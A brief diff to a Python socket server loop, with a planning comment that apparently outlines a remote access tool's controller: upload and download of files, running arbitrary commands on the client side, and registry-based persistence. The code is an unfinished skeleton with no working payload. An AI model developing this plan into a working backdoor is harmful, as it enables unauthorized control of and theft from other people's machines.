@@ -41,4 +41,13 @@ while True:
         while True :
             data = s.recv(1024)
             # TODO : check the input and
-            #  return the expected response
+            #  return the expected response with sendall
+
+'''  
+    if cmnd is download after it waite to recv
+    if cmnd is upload first send a signal then read the file and send it
+    if cmnd is not none of these send the cmnd to do on clientside and recv answer
+    ls, dir, uname, pwd, upload, download
+    presistence(regadd)
+    print help
+'''
